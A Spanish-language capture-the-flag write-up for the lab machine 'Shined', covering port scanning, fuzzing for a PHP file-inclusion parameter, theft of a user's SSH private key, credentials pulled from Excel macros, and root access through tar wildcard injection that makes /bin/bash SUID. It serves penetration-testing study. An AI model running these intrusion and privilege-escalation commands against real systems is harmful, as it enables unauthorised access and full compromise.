---
title: "Shined - TheHackerLabs"
date: 2025-02-06
draft: false
slug: "THL-writeup-shined"
excerpt: "Una máquina media que me hizo pensar bastante. Después de analizar los servicios, entramos en la página web activa y al no encontrar algo de utilidad, aplicamos Fuzzing para descubrir archivos y directorios ocultos, encontrando un archivo PHP que simulaba un login. Analizando este archivo, comenzamos a probar si es vulnerable a LFI, aplicando Fuzzing para encontrar un parámetro que se pudiera utilizar para esto. Encontrando un parámetro válido, aplicamos LFI para obtener la llave privada de un usuario, con la que nos podemos conectar a un contenedor en el puerto 2222. Dicho contenedor, tenía un archivo Excel (xlsm) que contenía las credenciales de un usuario del servicio SSH. Dentro del SSH, buscamos formas de escalar privilegios, encontrando un script y descubriendo que este es usado en una tarea CRON con pspy. Investigando un poco y analizando el script, encontramos que es vulnerable a inyecciones Wildcard, que aprovechamos para cambiar los permisos de la Bash para que tenga permisos SUID y con eso escalar privilegios."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Linux", "PHP", "Web Enumeration", "Fuzzing", "BurpSuite", "Local File Inclusion (LFI)", "SSH Private Key Theft (LFI)", "Malicious Macro Analysis (olevba)", "System Recognition (Linux)", "Wildcard Injection", "Privesc - Wildcard Injection", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "wfuzz"
  - "gobuster"
  - "BurpSuite"
  - "chmod"
  - "ssh"
  - "scp"
  - "olevba"
  - "sudo"
  - "find"
  - "cat"
  - "pspy64"
  - "echo"
  - "bash"
links:
  - "https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=LFI#basic-lfi-and-bypasses"
  - "https://brightsec.com/blog/local-file-inclusion-lfi/"
  - "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html?highlight=tar#tar"
  - "https://www-hackingarticles-in.translate.goog/exploiting-wildcard-for-privilege-escalation/?_x_tr_sl=en&_x_tr_tl=es&_x_tr_hl=es&_x_tr_pto=tc"
  - "https://gtfobins.github.io/gtfobins/tar/"
  - "https://github.com/DominicBreuker/pspy"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-shined/shined.webp"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.80
PING 192.168.1.80 (192.168.1.80) 56(84) bytes of data.
64 bytes from 192.168.1.80: icmp_seq=1 ttl=64 time=1.86 ms
64 bytes from 192.168.1.80: icmp_seq=2 ttl=64 time=0.870 ms
64 bytes from 192.168.1.80: icmp_seq=3 ttl=64 time=0.981 ms
64 bytes from 192.168.1.80: icmp_seq=4 ttl=64 time=0.810 ms

--- 192.168.1.80 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 0.810/1.129/1.857/0.424 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.80 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-06 12:59 CST
Initiating ARP Ping Scan at 12:59
Scanning 192.168.1.80 [1 port]
Completed ARP Ping Scan at 12:59, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:59
Scanning 192.168.1.80 [65535 ports]
Discovered open port 22/tcp on 192.168.1.80
Discovered open port 80/tcp on 192.168.1.80
Discovered open port 2222/tcp on 192.168.1.80
Completed SYN Stealth Scan at 12:59, 8.30s elapsed (65535 total ports)
Nmap scan report for 192.168.1.80
Host is up, received arp-response (0.00084s latency).
Scanned at 2025-02-06 12:59:01 CST for 8s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE      REASON
22/tcp   open  ssh          syn-ack ttl 64
80/tcp   open  http         syn-ack ttl 63
2222/tcp open  EtherNetIP-1 syn-ack ttl 63
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 8.59 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay solamente 3 puertos abiertos, aunque me da curiosidad el **puerto 2222**, pero por lo que sé, este puerto también es usado para el **servicio SSH**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80,2222 192.168.1.80 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-06 13:03 CST
Nmap scan report for 192.168.1.80
Host is up (0.0010s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   256 8d:9c:0e:58:72:31:a2:f9:81:15:34:9a:e7:07:f1:2a (ECDSA)
|_  256 d8:05:cc:bd:07:3b:c8:59:eb:5e:cd:ee:6e:52:c6:ab (ED25519)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))

|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: sungla
2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   256 09:20:97:b6:90:27:34:c4:f4:ed:35:c0:66:a3:f8:02 (ECDSA)
|_  256 a5:bc:e0:59:79:1e:b7:5f:93:65:b1:2f:0c:bb:b0:66 (ED25519)
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.24 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Ahí está, el **puerto 2222** es un **servicio SSH**, por lo demás parece que la intrusión será por la página web.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-shined/Captura1.png">
</p>

Pareciera que son bastantes cosillas que podemos ver, pero muchas de ellas no funcionan.

Veamos que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-shined/Captura2.png">
</p>

Bien, parece que está ocupando **PHP**, tengámoslo en cuenta para más adelante.

Si vamos hasta abajo, podemos ver que hay un correo electrónico registrado:

<p align="center">
<img src="/assets/images/THL-writeup-shined/Captura3.png">
</p>

Quizá sea un usuario llamado **shined**, guardemos ese correo por si las dudas.

Además, podemos ver un formulario que podemos llenar con los datos que piden:

<p align="center">
<img src="/assets/images/THL-writeup-shined/Captura4.png">
</p>

Pero al enviarlo no pasará nada, aunque sí podemos ver qué parámetros se están utilizando:

<p align="center">
<img src="/assets/images/THL-writeup-shined/Captura5.png">
</p>

Pero esto no nos servirá de mucho.

Vamos a aplicar **Fuzzing**, enfocándolo en archivos **PHP**.

### Fuzzing {#fuzz}

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,php-txt http://192.168.1.80/FUZZ.FUZ2Z
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.80/FUZZ.FUZ2Z
Total requests: 441090

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000001471:   200        63 L     129 W      1845 Ch     "access - php"                                                                                                               
000090451:   403        9 L      28 W       278 Ch      "php"                                                                                                                        

Total time: 0
Processed Requests: 441090
Filtered Requests: 441088
Requests/sec.: 0
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-z*	     | Para indicar una busqueda de archivos específicos. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.1.80/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -x php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.80/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 315] [--> http://192.168.1.80/images/]
/privacy              (Status: 301) [Size: 316] [--> http://192.168.1.80/privacy/]
/css                  (Status: 301) [Size: 312] [--> http://192.168.1.80/css/]
/access.php           (Status: 200) [Size: 1849]
/js                   (Status: 301) [Size: 311] [--> http://192.168.1.80/js/]
/.php                 (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 661635 / 661638 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*	     | Para indicar las extensiones de archivos especificas a buscar. |

Encontramos un **archivo PHP** que podemos visitar.

Veamos de que se trata:

<p align="center">
<img src="/assets/images/THL-writeup-shined/Captura6.png">
</p>

Parece un login muy simple.

### Analizando e Identificando LFI en Archivo access.php {#LFI}

Tratando de usar un usuario y contraseña cualquiera, no vemos que nos dé una respuesta errónea o válida, lo cual es extraño.

Si vemos el código fuente, parece que no va a ningún lado la data que enviemos:

<p align="center">
<img src="/assets/images/THL-writeup-shined/Captura7.png">
</p>

Esto es bastante extraño, por lo que es posible que aquí exista una vulnerabilidad.

Recordemos que **PHP** trabaja de forma dinámica, es decir, **PHP** permite la inclusión dinámica de archivos con distintas funciones como `include()`, `require()`, etc.

Esto permite que la mayoría (por no decir todo) de **archivos PHP** sean vulnerables a **LFI**.

El problema aquí, es que no tenemos un parámetro que podemos usar para aplicar el **LFI**, pues no sabemos si este archivo ocupa uno.

Así que vamos a aplicar **Fuzzing** para buscar si existe un parámetro de este archivo, pero para encontrarlo, debe existir un resultado válido que haya permitido el **LFI**, por lo que lo agregamos en el **Fuzzing**:
```bash
wfuzz -c --hc=404 --hh=1845 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.1.80/access.php?FUZZ=../../../../../../etc/passwd
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.80/access.php?FUZZ=../../../../../../etc/passwd
Total requests: 220545

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000003962:   200        88 L     164 W      3164 Ch     "inet"                                                                                                                       

Total time: 350.4376
Processed Requests: 220545
Filtered Requests: 220544
Requests/sec.: 629.3416
```
Ahí está, tenemos el parámetro.

Probemos si funciona:

<p align="center">
<img src="/assets/images/THL-writeup-shined/Captura8.png">
</p>

Excelente, pero será mejor aplicarlo desde **BurpSuite** para trabajarlo mejor:

<p align="center">
<img src="/assets/images/THL-writeup-shined/Captura9.png">
</p>

Ya desde aquí podemos usarlo mucho mejor.

## Explotación de Vulnerabilidades {#Explotacion}

### Obteniendo Llave Privada de Usuario cifra A través de LFI {#SSHLFI}

Podemos aplicar **LFI**, lo que significa que podemos ver cualquier archivo que deseáramos. De igual forma, ya vimos que existe un usuario llamado **cifra**.

Trataremos de obtener la llave privada que debería estar en la siguiente ruta: `/home/cifra/.ssh/id_rsa`.

Probemos:

<p align="center">
<img src="/assets/images/THL-writeup-shined/Captura10.png">
</p>

Excelente, la obtuvimos.

Cópiala en tu máquina y asígnale los permisos necesarios:
```bash
nano id_rsa
----------------
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEAuFRQ4zP1VRSL6EHONGERwViF9ZYKqNKO3W0vlzqqbPKW9khwvL81
banzYtUQF9e6aw97VYnXaDVU4QvjoECvQ4G7RmRl+UDZZOuJJGnkFOq24...
...
...
----------------
chmod 600 id_rsa
```

Ahora, tratemos de autenticarnos en el **servicio SSH**:
```bash
ssh -i id_rsa cifra@192.168.1.80
The authenticity of host '192.168.1.80 (192.168.1.80)' can't be established.
ED25519 key fingerprint is SHA256:6XjRB0dTQPfS0nNhz1dBC/8mKVHoFxRIhuCbXUlW83U.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.80' (ED25519) to the list of known hosts.
Load key "id_rsa": error in libcrypto
cifra@192.168.1.80's password: 
Permission denied, please try again.
```
Nos está pidiendo la contraseña, entonces aquí no la podemos usar.

Probemos con el **puerto 2222** que también tiene activo un **servicio SSH**:
```bash
ssh -i id_rsa cifra@192.168.1.80 -p 2222
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Apr  9 13:53:46 2024
cifra@b13d359bc30b:~$ whoami
cifra
```
Estamos dentro.

### Enumeración de Contenedor y Obteniendo Credenciales del Servicio SSH de Archivo xlsm con olevba {#Contenedor}

Resulta que estamos dentro de un contenedor:
```bash
cifra@b13d359bc30b:~$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether XX  txqueuelen 0  (Ethernet)
        RX packets 2789354  bytes 404430838 (404.4 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1971627  bytes 1315415044 (1.3 GB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
...
...
```

Veamos si hay algún archivo por aquí:
```bash
cifra@b13d359bc30b:~$ ls -la
total 44
drwxr-xr-x 4 cifra cifra  4096 Apr  8  2024 .
drwxr-xr-x 1 root  root   4096 Apr  7  2024 ..
-rwxr-xr-x 1 cifra cifra   220 Apr  7  2024 .bash_logout
-rwxr-xr-x 1 cifra cifra  3771 Apr  7  2024 .bashrc
drwx------ 2 cifra cifra  4096 Apr  7  2024 .cache
-rwxr-xr-x 1 cifra cifra   807 Apr  7  2024 .profile
drwxr-xr-x 2 cifra cifra  4096 Apr  7  2024 .ssh
-rw-r--r-- 1 root  root  13315 Apr  8  2024 contabilidad.xlsm
```
Hay un archivo y me parece que esa extensión es de archivos de **Excel**.

Vamos a copiar en nuestra máquina con **scp**:
```bash
scp -i id_rsa -P 2222 cifra@192.168.1.80:/home/cifra/contabilidad.xlsm .
contabilidad.xlsm
```

Existen 2 herramientas que podemos usar para ver el contenido de estos archivos:
* Herramienta **xlsx2csv** que permite solo ver datos básicos sin macros.
* Herramienta **olevba** que permite ver archivos con macros.

Para este caso, vamos a usar **olevba** porque este archivo contiene macros.

Vamos a instalarlo:
```bash
pip install oletools
```

Y lo usamos:
```bash
olevba contabilidad.xlsm
olevba 0.60.2 on Python 2.7.18 - http://decalage.info/python/oletools
===============================================================================
FILE: contabilidad.xlsm
Type: OpenXML
...
...
...
Attribute Macro1.VB_Description = "leopoldo:***"
Attribute Macro1.VB_ProcData.VB_Invoke_Func = " \n14"
'
' Macro1 Macro
' leopoldo:***
...
...
```
Tenemos nuevas credenciales de acceso.

Vamos a probarlas con el otro **servicio SSH**:
```bash
ssh leopoldo@192.168.1.80
leopoldo@192.168.1.80's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)
...
...
...
...
Last login: Tue Apr  9 14:45:36 2024
leopoldo@shined:~$ whoami
leopoldo
```
Muy bien, estamos dentro.

Obtengamos la flag del usuario:
```bash
leopoldo@shined:~$ ls
Desktop  Documents  Downloads  user.txt
leopoldo@shined:~$ cat user.txt
...
```

## Post Explotación {#Post}

### Enumeración de la Máquina Víctima {#LinEnum}

Veamos qué privilegios tiene nuestro usuario:
```bash
leopoldo@shined:~$ sudo -l
[sudo] password for leopoldo: 
Sorry, user leopoldo may not run sudo on shined.
```
No tiene ninguno.

Veamos si existe algún **binario SUID** que podamos usar:
```bash
leopoldo@shined:~$ find / -perm -4000 2>/dev/null
/usr/libexec/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/fusermount3
/usr/bin/su
/usr/bin/umount
...
...
```
No hay alguno que podamos usar.

Recordemos que hay directorios que pertenecen al **usuario leopoldo**, pero únicamente el directorio **Desktop** tiene un directorio que contiene un archivo comprimido:
```bash
leopoldo@shined:~$ ls Desktop/scripts/
backup.tgz
```
Aunque si descargamos y descomprimimos ese archivo, no tendrá nada.

Si revisamos el **directorio tmp**, encontraremos dos archivos:
```bash
leopoldo@shined:/tmp$ ls -la
total 56
drwxrwxrwt 12 root root 4096 Feb  7 00:13 .
drwxr-xr-x 20 root root 4096 Apr  7  2024 ..
-rwxr-xr-x  1 root root  101 Apr  7  2024 backup.sh
-rwxr-xr-x  1 root root   81 Apr  9  2024 clean.sh
drwxrwxrwt  2 root root 4096 Apr  7  2024 .font-unix
drwxrwxrwt  2 root root 4096 Apr  7  2024 .ICE-unix
drwx------  3 root root 4096 Feb  6 18:52 snap-private-tmp
drwx------  3 root root 4096 Feb  6 18:52 systemd-private-e5d53eea7a0b49c483c14a5c02f8fb5a-ModemManager.service-fJAdaJ
drwx------  3 root root 4096 Feb  6 18:52 systemd-private-e5d53eea7a0b49c483c14a5c02f8fb5a-systemd-logind.service-h0gFai
drwx------  3 root root 4096 Feb  6 18:52 systemd-private-e5d53eea7a0b49c483c14a5c02f8fb5a-systemd-resolved.service-70x9ou
drwx------  3 root root 4096 Feb  6 18:52 systemd-private-e5d53eea7a0b49c483c14a5c02f8fb5a-systemd-timesyncd.service-kEhVib
drwxrwxrwt  2 root root 4096 Apr  7  2024 .Test-unix
drwxrwxrwt  2 root root 4096 Apr  7  2024 .X11-unix
drwxrwxrwt  2 root root 4096 Apr  7  2024 .XIM-unix
```
Hay 2 scripts ahí.

Veamos el contenido del script **backup.sh**:
```bash
leopoldo@shined:/tmp$ cat backup.sh 
#!/bin/bash

cd /home/leopoldo/Desktop/scripts/
tar -zcf /home/leopoldo/Desktop/scripts/backup.tgz *
```
Parece que está comprimiendo todo lo que se encuentre dentro del directorio `/scripts` y lo guarda dentro de un archivo llamado **backup.tgz**.

Ahora veamos el contenido del script **clean.sh**:
```bash
leopoldo@shined:/tmp$ cat clean.sh 
#!/bin/bash

DIRECTORIO="/home/leopoldo/Desktop/scripts"

rm -rf "$DIRECTORIO"/*
```
Parece que este script elimina todo lo que este dentro del directorio `/scripts`.

Quiero suponer que estos archivos están siendo usados por una tarea en segundo plano, por lo que vamos a usar **pspy** para comprobar esto.

Aquí puedes obtener **pspy**:
* <a href="https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1" target="_blank">Repositorio de DominicBreuker: pspy - Releases</a>

Puedes copiarlo con **wget** desde la máquina víctima hacia un servidor de **Python** donde lo tengas descargado.

Una vez que lo tengas, ejecútalo:
```bash
leopoldo@shined:~/Desktop$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d

     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2025/02/07 00:33:31 CMD: UID=1001  PID=6560   | ./pspy64 
2025/02/07 00:33:31 CMD: UID=0     PID=6532   |
...
...
...
2025/02/07 00:33:31 CMD: UID=0     PID=1      | /sbin/init 
2025/02/07 00:33:32 CMD: UID=0     PID=6568   | 
2025/02/07 00:34:01 CMD: UID=0     PID=6569   | /usr/sbin/CRON -f -P 
2025/02/07 00:34:01 CMD: UID=0     PID=6570   | /usr/sbin/CRON -f -P 
2025/02/07 00:34:01 CMD: UID=0     PID=6571   | /bin/bash /tmp/backup.sh 
2025/02/07 00:34:01 CMD: UID=0     PID=6572   | /bin/bash /tmp/backup.sh 
2025/02/07 00:34:01 CMD: UID=0     PID=6573   | tar -zcf /home/leopoldo/Desktop/scripts/backup.tgz backup.tgz 
2025/02/07 00:34:01 CMD: UID=0     PID=6574   | /bin/sh -c gzip 
2025/02/07 00:35:01 CMD: UID=0     PID=6577   | /usr/sbin/CRON -f -P 
2025/02/07 00:35:01 CMD: UID=0     PID=6578   | /usr/sbin/CRON -f -P 
2025/02/07 00:35:01 CMD: UID=0     PID=6579   | /bin/sh -c /bin/bash /tmp/backup.sh 
2025/02/07 00:35:01 CMD: UID=0     PID=6580   | /bin/bash /tmp/backup.sh 
2025/02/07 00:35:01 CMD: UID=0     PID=6581   | tar -zcf /home/leopoldo/Desktop/scripts/backup.tgz backup.tgz 
2025/02/07 00:35:01 CMD: UID=0     PID=6582   | /bin/sh -c gzip
```
Parece que se ejecuta el script **backup.sh** y luego se comprime el archivo resultante, es bastante extraño, pero parece que ese script será con el que podamos escalar privilegios.

### Aplicando Wildcard Injection para Modificar la Bash y Escalar Privilegios {#Wildcard}

Al analizar los scripts y los comandos que se estaban ejecutando con la ayuda de **ChatGPT**, me indico que es vulnerable a inyecciones con el **comando tar**.

E investigando un poco, encontramos el siguiente blog que nos explica sobre las **Wildcard Injection**:
* <a href="https://www-hackingarticles-in.translate.goog/exploiting-wildcard-for-privilege-escalation/?_x_tr_sl=en&_x_tr_tl=es&_x_tr_hl=es&_x_tr_pto=tc" target="_blank">Exploiting Wildcard for Privilege Escalation</a>

Nos basaremos en el método 3 en donde asignan **permisos SUID** al binario que deseas, esto para darle **permisos SUID** a la **Bash**.

Pero antes, definamos que son las **Wildcard Injections**:

| **Wildcard Injections (Inyección de comodines en shell)** |
|:-----------:|
| *La Wildcard Injection es una vulnerabilidad en la que un atacante aprovecha los comodines (\*, ?, [ ]) en comandos de shell para ejecutar código malicioso. Esto suele ocurrir en comandos como tar, rm, mv, cp, chmod, entre otros.* |

Ahora si, apliquémoslo.

Todo este proceso debe ser dentro del directorio `/home/leopoldo/Desktop/scripts` porque el script **backup.sh** trabaja con ese directorio, por lo que las inyecciones se aplicaran aquí.

Primero, vamos a crear un script que tenga los comandos que le darán **permisos SUID** a la **Bash**:
```bash
leopoldo@shined:~/Desktop/scripts$ echo "chmod u+s /bin/bash" > pwned.sh
```

Ahora, vamos a inyectar nuestro script para que se ejecute al momento de que **backup.sh** sea ejecutado:
```bash
leopoldo@shined:~/Desktop/scripts$ echo "" > "--checkpoint-action=exec=sh pwned.sh"
leopoldo@shined:~/Desktop/scripts$ echo "" > --checkpoint=1
```

Revisemos los permisos de la **Bash**:
```bash
leopoldo@shined:~/Desktop/scripts$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```
Aún no tiene **permiso SUID**.

Ejecutemos **backup.sh**:
```bash
leopoldo@shined:~/Desktop/scripts$ /tmp/./backup.sh 
tar (child): /home/leopoldo/Desktop/scripts/backup.tgz: Cannot open: Permission denied
tar (child): Error is not recoverable: exiting now
chmod: changing permissions of '/bin/bash': Operation not permitted
tar: /home/leopoldo/Desktop/scripts/backup.tgz: Cannot write: Broken pipe
tar: Child returned status 2
tar: Error is not recoverable: exiting now
```

Y revisemos los permisos de la **Bash**:
```bash
leopoldo@shined:~/Desktop/scripts$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

Usemos la **Bash** con privilegios:
```bash
leopoldo@shined:~/Desktop/scripts$ bash -p
bash-5.1# whoami
root
```
Ahora somos **Root**.

Ya solo busca la flag del **Root**:
```bash
bash-5.1# cd /root
bash-5.1# ls
root.txt  snap
bash-5.1# cat root.txt
...
```
Y con esto concluimos la máquina.
